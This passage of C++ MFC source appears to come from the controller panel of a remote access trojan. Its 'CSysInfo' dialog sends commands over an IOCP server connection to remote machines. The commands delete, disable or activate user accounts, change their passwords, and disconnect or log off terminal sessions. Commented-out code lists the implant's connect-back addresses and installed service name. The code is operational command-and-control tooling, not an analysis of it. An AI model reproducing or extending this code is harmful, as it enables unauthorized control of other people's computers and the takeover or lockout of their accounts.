	else if (m_list_wtsm.IsWindowVisible())
		return;
	*pResult = 0;
	CMenu	popup;
	popup.LoadMenu(IDR_SLIST);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y,this);
	
	*pResult = 0;
}

void CSysInfo::OnRefreshpslist() 
{
	// TODO: Add your command handler code here
	if (m_list_sev.IsWindowVisible())
		GetSevList();
	if (m_list_wtsm.IsWindowVisible())
		GetWtsmList();
	if (m_list.IsWindowVisible())
		GetSysinfoList();
// 	if (m_list_online.IsWindowVisible())
// 		GetInstallinfoList();
}

void CSysInfo::OnDeluser() 
{
	// TODO: Add your command handler code here
	CListCtrl	*pListCtrl = NULL;
	if (m_list_sev.IsWindowVisible())
		pListCtrl = &m_list_sev;
	else
		return;

	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl

	CString Data;
	CString Name;

	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = COMMAND_DELUSER;
	dwOffset = 1;

	if  (pos  ==  NULL)
	{
		AfxMessageBox(_T("请先选择要删除的用户"));
		return;
	}
	else
	{
		while(pos)
		{
			int	nItem = pListCtrl->GetNextSelectedItem(pos);
			Name = pListCtrl->GetItemText(nItem, 0);
			Data += Name;
			Data += _T("\r\n");
		}
		Data = Data.Left(Data.GetLength() - 2);
		memcpy(lpBuffer + dwOffset, Data.GetBuffer(0), (Data.GetLength() + 1)*sizeof(TCHAR));
		dwOffset += (Data.GetLength() + 1)*sizeof(TCHAR);
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

void CSysInfo::OnChangepassword() 
{
	// TODO: Add your command handler code here
	CListCtrl	*pListCtrl = NULL;
	if (m_list_sev.IsWindowVisible())
		pListCtrl = &m_list_sev;
	else
		return;
	
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	CInputDialog	dlg;
	dlg.Init(_T("修改密码"), _T("请输入要修改的密码密码:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();

	CString Data;
	CString Name;
	
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = COMMAND_NET_CHANGE_PASS;
	dwOffset = 1;
	
	if  (pos  ==  NULL)
	{
		AfxMessageBox(_T("请先选择要修改密码的用户"));
		return;
	}
	else
	{
		while(pos)
		{
			int	nItem = pListCtrl->GetNextSelectedItem(pos);
			Name = pListCtrl->GetItemText(nItem, 0);
			Data += Name;
			Data += _T("\r\n");
		}
		Data = Data.Left(Data.GetLength() - 2);
		memcpy(lpBuffer + dwOffset, Data.GetBuffer(0), (Data.GetLength() + 1)*sizeof(TCHAR));
		dwOffset += (Data.GetLength() + 1)*sizeof(TCHAR);

		memcpy(lpBuffer + dwOffset, dlg.m_str.GetBuffer(0), (dlg.m_str.GetLength() + 1)*sizeof(TCHAR));
		dwOffset += (dlg.m_str.GetLength() + 1)*sizeof(TCHAR);
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

void CSysInfo::OnRclickListWts(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	if (m_list.IsWindowVisible())
		return;
	else if (m_list_sev.IsWindowVisible())
		return;
	*pResult = 0;
	CMenu	popup;
	popup.LoadMenu(IDR_WLIST);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	
	CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y,this);
	
	*pResult = 0;
}

void CSysInfo::OnDisconnectUser() 
{
	// TODO: Add your command handler code here
	CListCtrl	*pListCtrl = NULL;
	if (m_list_wtsm.IsWindowVisible())
		pListCtrl = &m_list_wtsm;
	else
		return;
	
	// TODO: Add your command handler code here
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
	lpBuffer[0] = COMMAND_WTS_Disconnect;
	
	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	int	nItem=0;
	if  (pos  ==  NULL)
	{
		AfxMessageBox(_T("请先选择要断开的用户"));
		return;
	}
	else
	{
		while(pos) //so long as we have a valid POSITION, we keep iterating
		{
			nItem = pListCtrl->GetNextSelectedItem(pos);
			DWORD dwProcessID = pListCtrl->GetItemData(nItem);
			memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
			dwOffset += sizeof(DWORD);
		}
	}
	
	char *lpTips = _T("警告: 断开用户会导致不希望发生的结果，\n");
	CString str;
	
	str.Format(_T("%s确实 想断开这%s 用户吗?"), lpTips, pListCtrl->GetItemText(nItem,1));
	
	if (::MessageBox(m_hWnd, str, _T("断开用户警告"), MB_YESNO|MB_ICONQUESTION) == IDNO)
	{
		LocalFree(lpBuffer);
		return;
	}
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSysInfo::OnLogoffUser() 
{
	// TODO: Add your command handler code here
	CListCtrl	*pListCtrl = NULL;
	if (m_list_wtsm.IsWindowVisible())
		pListCtrl = &m_list_wtsm;
	else
		return;
	
	// TODO: Add your command handler code here
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
	lpBuffer[0] = COMMAND_WTS_Logoff;
	
	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	int	nItem=0;
	if  (pos  ==  NULL)
	{
		AfxMessageBox(_T("请先选择要断开的用户"));
		return;
	}
	else
	{
		while(pos) //so long as we have a valid POSITION, we keep iterating
		{
			nItem = pListCtrl->GetNextSelectedItem(pos);
			DWORD dwProcessID = pListCtrl->GetItemData(nItem);
			memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
			dwOffset += sizeof(DWORD);
		}
	}
	
	char *lpTips = _T("警告: 注销用户会导致不希望发生的结果，\n");
	CString str;
	
	str.Format(_T("%s确实 想注销这%s 用户吗?"), lpTips, pListCtrl->GetItemText(nItem,1));
	
	if (::MessageBox(m_hWnd, str, _T("注销用户警告"), MB_YESNO|MB_ICONQUESTION) == IDNO)
	{
		LocalFree(lpBuffer);
		return;
	}
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void SetClipboardTexts1(CString &Data)
{
	if(OpenClipboard(NULL) == 0)
		return;
	EmptyClipboard();
	HGLOBAL htext = GlobalAlloc(GHND, Data.GetLength() + 1);
	if(htext != 0)
	{
		CopyMemory(GlobalLock(htext), Data.GetBuffer(0), Data.GetLength());
		GlobalUnlock(htext);
		SetClipboardData(1, (HANDLE)htext);
		GlobalFree(htext);
	}
	CloseClipboard();
}

void CSysInfo::OnCopy() 
{
	// TODO: Add your command handler code here
	CListCtrl	*pListCtrl = NULL;
	if (m_list_sev.IsWindowVisible())
		pListCtrl = &m_list_sev;
	else if (m_list_wtsm.IsWindowVisible())
		pListCtrl = &m_list_wtsm;
	else if (m_list.IsWindowVisible())
		pListCtrl = &m_list;
// 	else if (m_list_online.IsWindowVisible())
// 		pListCtrl = &m_list_online;
	else
		return;

	POSITION pos = pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	
	if  (pos  ==  NULL)
	{
		AfxMessageBox(_T("请先选择要复制的内容"));
		return;
	}
	else
	{
		while(pos)
		{
			Name = "";
			int	nItem = pListCtrl->GetNextSelectedItem(pos);
			for(int i = 0; i < pListCtrl->GetHeaderCtrl()-> GetItemCount(); i++)
			{
				Name += pListCtrl->GetItemText(nItem, i);
				Name += "|";
			}
			Data += Name;
			Data += "\r\n";
		}
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardTexts1(Data);	
	MessageBox(_T("信息已复制到剪切板"),_T("提示"), MB_ICONINFORMATION);
}

void CSysInfo::OnRclickInfoList(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	if (m_list_wtsm.IsWindowVisible())
		return;
	else if (m_list_sev.IsWindowVisible())
		return;
	*pResult = 0;
	CMenu	popup;
	popup.LoadMenu(IDR_ILIST);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	
	CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y,this);
	
	*pResult = 0;
}

void CSysInfo::SortColumn1(int iCol, bool bAsc)
{
	m_bAscending1 = bAsc;
	m_nSortedCol1 = iCol;
	
	// set sort image for header and sort column.
	CXTPSortClass csc1(&m_list, m_nSortedCol1);
	csc1.Sort(m_bAscending1, xtpSortString);
}

void CSysInfo::SortColumn2(int iCol, bool bAsc)
{
	m_bAscending2 = bAsc;
	m_nSortedCol2 = iCol;
	
	// set sort image for header and sort column.
	CXTPSortClass csc2(&m_list_sev, m_nSortedCol2);;
	csc2.Sort(m_bAscending2, xtpSortString);
}

void CSysInfo::SortColumn3(int iCol, bool bAsc)
{
	m_bAscending3 = bAsc;
	m_nSortedCol3 = iCol;
	// set sort image for header and sort column.
	CXTPSortClass csc3(&m_list_wtsm, m_nSortedCol3);
	csc3.Sort(m_bAscending3, xtpSortString);
}

/*
void CSysInfo::SortColumn4(int iCol, bool bAsc)
{
	m_bAscending4 = bAsc;
	m_nSortedCol4 = iCol;
	// set sort image for header and sort column.
	CXTPSortClass csc4(&m_list_online, m_nSortedCol4);
	csc4.Sort(m_bAscending4, xtpSortString);
}*/


BOOL CSysInfo::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult)
{
	HD_NOTIFY *pHDNotify = (HD_NOTIFY*)lParam;
	
	if (pHDNotify->hdr.code == HDN_ITEMCLICKA ||
		pHDNotify->hdr.code == HDN_ITEMCLICKW)
	{
// 		switch (m_system_tab.GetCurSel())
// 		{
// 		case 0:
			SortColumn1(pHDNotify->iItem, !m_bAscending1);
// 			break;
// 		case 1:
// 			SortColumn2(pHDNotify->iItem, !m_bAscending2);
// 			break;
// 		case 2:
// 			SortColumn3(pHDNotify->iItem, !m_bAscending3);
// 			break;
// 		case 3:
// 			SortColumn4(pHDNotify->iItem, !m_bAscending4);
// 			break;
//		}
	}
	return CDialog::OnNotify(wParam, lParam, pResult);
}


void CSysInfo::OnActiveUser() 
{
	// TODO: Add your command handler code here
	CListCtrl	*pListCtrl = NULL;
	if (m_list_sev.IsWindowVisible())
		pListCtrl = &m_list_sev;
	else
		return;
	
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	CString Data;
	CString Name;
	
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = COMMAND_ACITVEUSER;
	dwOffset = 1;
	
	if  (pos  ==  NULL)
	{
		return;
	}
	else
	{
		while(pos)
		{
			int	nItem = pListCtrl->GetNextSelectedItem(pos);
			Name = pListCtrl->GetItemText(nItem, 0);
			Data += Name;
			Data += _T("\r\n");
		}
		Data = Data.Left(Data.GetLength() - 2);
		memcpy(lpBuffer + dwOffset, Data.GetBuffer(0), (Data.GetLength() + 1)*sizeof(TCHAR));
		dwOffset += (Data.GetLength() + 1)*sizeof(TCHAR);
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

void CSysInfo::OnDisableuser() 
{
	// TODO: Add your command handler code here
	CListCtrl	*pListCtrl = NULL;
	if (m_list_sev.IsWindowVisible())
		pListCtrl = &m_list_sev;
	else
		return;
	
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	CString Data;
	CString Name;
	
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = COMMAND_DISABLEEUSER;
	dwOffset = 1;
	
	if  (pos  ==  NULL)
	{
		return;
	}
	else
	{
		while(pos)
		{
			int	nItem = pListCtrl->GetNextSelectedItem(pos);
			Name = pListCtrl->GetItemText(nItem, 0);
			Data += Name;
			Data += _T("\r\n");
		}
		Data = Data.Left(Data.GetLength() - 2);
		memcpy(lpBuffer + dwOffset, Data.GetBuffer(0), (Data.GetLength() + 1)*sizeof(TCHAR));
		dwOffset += (Data.GetLength() + 1)*sizeof(TCHAR);
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

void CSysInfo::GetInstallinfoList()
{
// 	BYTE bToken = COMMAND_SEND_INSTALLINFO;
// 	m_iocpServer->Send(m_pContext, &bToken, 1);
// 	LocalFree((LPBYTE)&bToken);
}

/*
void CSysInfo::ShowInstallList()
{
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	memcpy(&m_InsInfo, lpBuffer , sizeof(tagOnlineInfo));
	
	m_list_online.SetRedraw(FALSE);//禁止闪烁
	m_list_online.DeleteAllItems();
	
	m_list_online.InsertItem(0, _T("上线方式"),0);
	m_list_online.InsertItem(1, _T("上线地址"), 1);
	m_list_online.InsertItem(2, _T("安装方式"),2);
	m_list_online.InsertItem(3, _T("安装服务名"),4);
	
	m_list_online.SetItemText(0, 1, m_InsInfo.szrHostA);
	m_list_online.SetItemText(1, 1, m_InsInfo.szrHostB);
	m_list_online.SetItemText(2, 1, m_InsInfo.szrInstallTime);
	m_list_online.SetItemText(3, 1, m_InsInfo.szrSerName);
	
	//更新窗口
	m_list_online.SetRedraw(TRUE); 
	m_list_online.Invalidate(); 
	m_list_online.UpdateWindow();	
}*/

